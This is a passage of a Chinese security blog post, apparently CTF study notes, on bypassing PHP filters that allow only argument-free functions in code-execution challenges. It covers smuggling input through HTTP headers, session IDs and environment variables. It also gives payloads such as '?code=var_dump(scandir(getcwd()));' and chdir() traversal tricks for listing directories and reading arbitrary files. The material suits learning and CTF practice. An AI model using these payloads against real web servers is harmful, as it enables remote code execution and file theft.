+<p>(?R)是引用当前表达式的意思，即可以用\w+((?R)?)替换到(?R)的位置，因此可以衍生成匹配\w+(\w+((?R)?))、\w+(\w+(\w+((?R)?)))、…<br>可以是a()、a(b())或a(b(c()))，但不能是a(‘b’)或a(‘b’,’c’)，不能带参数</p>
+<h4 id="从外取值"><a href="#从外取值" class="headerlink" title="从外取值"></a>从外取值</h4><h5 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1.getallheaders()"></a>1.getallheaders()</h5><p>这个函数的作用是获取http所有的头部信息，即headers，但这个有个限制条件就是必须在apache的环境下可以使用<br>返回值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(8) &#123; </span><br><span class="line">    [&quot;Host&quot;]=&gt; string(14) &quot;106.14.114.127&quot; </span><br><span class="line">    [&quot;Connection&quot;]=&gt; string(10) &quot;keep-alive&quot; </span><br><span class="line">    [&quot;Cache-Control&quot;]=&gt; string(9) &quot;max-age=0&quot; </span><br><span class="line">    [&quot;Upgrade-Insecure-Requests&quot;]=&gt; string(1) &quot;1&quot; </span><br><span class="line">    [&quot;User-Agent&quot;]=&gt; string(120) &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot; </span><br><span class="line">    [&quot;Accept&quot;]=&gt; string(118) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span><br><span class="line">     [&quot;Accept-Encoding&quot;]=&gt; string(13) &quot;gzip, deflate&quot; [&quot;Accept-Language&quot;]=&gt; string(14) &quot;zh-CN,zh;q=0.9&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/QQ%E6%88%AA%E5%9B%BE20220802184221.png" alt="QQ截图20220802184221"><br>如果当前为多元数组，则返回的元素为数组，另外current的还有个别名为<strong>pos</strong><br>有的时候当我们想读的文件比较靠后时，就可以用array_reverse()这个函数把它倒过来，就可以少用几个next()</p>
+<p>我们在http header中写入我们的参数，可用其进行bypass 无参数函数执行<br>例如<br><code>end(getallheaders())</code></p>
+<h5 id="2-get-defined-vars-版本要求：PHP-4-gt-4-0-4-PHP-5-PHP-7"><a href="#2-get-defined-vars-版本要求：PHP-4-gt-4-0-4-PHP-5-PHP-7" class="headerlink" title="2.get_defined_vars()(版本要求：PHP 4 &gt;= 4.0.4, PHP 5, PHP 7)"></a>2.get_defined_vars()(版本要求：PHP 4 &gt;= 4.0.4, PHP 5, PHP 7)</h5><p>返回一个包含所有已定义变量列表的<strong>多维</strong>数组，这些变量包括环境变量、服务器变量和用户定义的变量。<br>在这里可以发现其只能回显全局变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure>
+<h5 id="3-session-id"><a href="#3-session-id" class="headerlink" title="3.session_id()"></a>3.session_id()</h5><p>注意的就是session_id()要开启session才能用，session_id()会获取/设置COOKIE的PHPSESSID，<br>但PHPSESSID允许字母和数字出现，我们可以先将其16进制编码，再用hex2bin函数将16进制转换为字符串</p>
+<h5 id="4-getenv"><a href="#4-getenv" class="headerlink" title="4.getenv()"></a>4.getenv()</h5><p>getenv() ：获取环境变量的值(在PHP7.1之后可以不给予参数)<br>所以该函数只适用于PHP7.1之后版本<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1594112652.jpg" alt="1594112652"><br>我们怎么从一个偌大的数组中取出我们指定的值,我们可用爆破的方式获取数组中任意位置需要的值<br>array_rand随机返回一个或多个键，第二个参数用来确定要选出几个键，默认是一个键<br>array_flip交换数组中的键和值</p>
+<h4 id="直接读取文件"><a href="#直接读取文件" class="headerlink" title="直接读取文件"></a>直接读取文件</h4><h5 id="路径操作"><a href="#路径操作" class="headerlink" title="路径操作"></a>路径操作</h5><ol>
+<li>获取当前目录</li>
+</ol>
+<ul>
+<li><p>getcwd()获取当前目录</p>
+</li>
+<li><p>scandir()列出目录中的文件和目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br><span class="line"></span><br><span class="line">array(3) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; &#125;</span><br></pre></td></tr></table></figure>
+<p>正常的，也可以使用print_r(scandir(‘.’));来查看当前目录所有文件名</p>
+</li>
+<li><p>localeconv() 函数返回一个包含本地数字及货币格式信息的数组，它返回的是一个二维数组，而它的第一位就是一个点.<br><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/1594112630.jpg" alt="1594112630"></p>
+</li>
+<li><p>chr(46)<br>chr(46)就是字符.,chr() 函数以256为一个周期，所以 chr(46)、chr(302)、chr(558)等都等于 .</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1. phpversion()</span><br><span class="line">如果PHP版本为5</span><br><span class="line">floor(phpversion())返回 5</span><br><span class="line">sqrt(floor(phpversion()))返回2.2360679774998</span><br><span class="line">tan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615</span><br><span class="line">cosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491</span><br><span class="line">sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156</span><br><span class="line">ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46</span><br><span class="line">chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回&quot;.&quot;</span><br><span class="line">2. time()</span><br><span class="line">返回自从 Unix 纪元（格林威治时间 1970 年 1 月 1 日 00:00:00）到当前时间的秒数,date(&quot;Y-m-d&quot;,$t)可以返回当地时间。</span><br><span class="line">chr(time())，一个周期(256)必定出现一次&quot;.&quot;</span><br><span class="line">chr(localtime(time())) 以数组的形式返回本地时间，第一个值为秒，则一个周期(60)必定出现一次&quot;.&quot;</span><br><span class="line">3. crypt</span><br><span class="line">hebrevc(crypt(arg))可以随机生成一个hash值，第一个字符随机是$(大概率) 或者 &quot;.&quot;(小概率) 然后通过chr(ord())只取第一个字符</span><br><span class="line">chr(ord(hebrevc(crypt(time()))))</span><br></pre></td></tr></table></figure></li>
+<li><p>其他获得.的方法<br>strrev(crypt(serialize(array())))也可以得到”.”</p>
+</li>
+</ul>
+<ol start="2">
+<li>目录遍历<br>那么既然不在这一层目录，如何进行目录上跳呢？</li>
+</ol>
+<ul>
+<li>dirname()返回路径中的目录部分</li>
+<li>chdir()可以更改我们的当前目录<br>通过不断切换目录实现任意文件读取<br>当然chdir(‘..’),即chdir(next(scandir(getcwd()))),也可以更改我们的当前目录</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/rce/" rel="tag"># rce</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/15/misc/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8Clinux/" rel="prev" title="命令执行和linux">
+                  <i class="fa fa-chevron-left"></i> 命令执行和linux
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/09/27/php/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="php反序列化">
+                  php反序列化 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mayylu</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
